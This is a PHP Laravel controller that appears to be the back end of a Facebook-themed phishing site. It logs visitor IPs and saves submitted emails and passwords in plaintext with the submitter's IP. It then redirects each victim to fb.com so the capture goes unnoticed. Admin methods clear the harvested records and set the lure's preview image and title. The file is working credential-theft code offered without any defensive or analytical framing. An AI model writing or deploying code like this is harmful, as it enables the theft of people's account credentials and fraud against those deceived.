<?php

namespace App\Http\Controllers;

use App\Account;
use App\Assed;
use App\Meta;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;

class HomeController extends Controller
{
    public function root(Request $request)
    {
        $demo = Assed::where('ip',$request->ip())->first();
        if ($demo) {
            $demo->ip = $request->ip();
            $demo->payload = $demo->payload+1;
            $demo->save();
        }else{
            $assed = New Assed;
            $assed->ip = $request->ip();
            $assed->payload = 1;
            $assed->save();
        }
        return view('welcome');
    }
    
    public function index()
    {
        
        return view('home');
    }

    public function post(Request $request)
    {
        $accoutn = New Account;
        $accoutn->email = $request->email;
        $accoutn->password = $request->password;
        $accoutn->ip = $request->ip();
        $accoutn->save();
        return Redirect::to('http://fb.com');
    }

    public function delete_payload()
    {
        $payloads = Assed::get();
        foreach ($payloads as $value) {
            $value->delete();
        }
        return back();
    }

    public function account_payload($id)
    {
        Account::find($id)->delete();
        return back();
    }

    public function meta(Request $request)
    {
        $accoutn = Meta::find(2);
        $accoutn->image = $request->image->store('images');
        $accoutn->title = $request->title;
        $accoutn->save();
        return back();
    }

}
